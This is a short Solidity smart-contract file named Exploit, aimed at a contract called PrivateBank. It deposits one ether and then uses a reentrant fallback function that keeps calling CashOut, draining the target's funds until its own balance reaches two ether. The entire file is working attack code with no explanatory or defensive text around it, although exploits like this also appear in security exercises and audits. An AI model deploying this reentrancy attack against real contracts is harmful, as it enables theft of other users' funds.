pragma solidity ^0.4.18;

import "./PrivateBankI.sol";

contract Exploit {
  address public _targetAddress;
  PrivateBankI _target;

  function Exploit(address _targetContract) public payable {
    _targetAddress = _targetContract;
    _target = PrivateBankI(_targetContract);
  }

  function tryIt() public payable {
    // Send an ether so we have something to withdraw.
    _target.Deposit.value(1 ether)();

    // Withdraw, but try to exploit reentrancy vulnerability.
    _target.CashOut(1 ether);
  }

  function () public payable {
    // Keep going until we have 2 ethers.
    if (this.balance < 2 ether) {
      _target.CashOut(1 ether);
    }
  }

  function getBalance() public view returns (uint256) {
    return this.balance;
  }
}
